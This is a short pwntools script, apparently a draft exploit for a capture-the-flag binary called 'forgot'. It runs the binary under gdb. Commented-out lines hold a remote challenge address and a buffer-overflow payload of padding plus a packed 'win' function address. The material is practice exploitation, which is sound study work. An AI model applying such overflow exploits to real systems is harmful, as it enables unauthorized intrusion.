from pwn import *
#h,p = '111.200.241.244',60907
#p = remote(h,p)
p = process("./forgot")
gdb.attach("forgot")
p.sendlineafter(">","aaa")
exp="a"
#exp = "aaaabbbbccccddddeeeeffffgggghhhhiiii"
#win = 0x80486cc
#exp+= p32(win)
p.sendline(exp)
p.interactive()
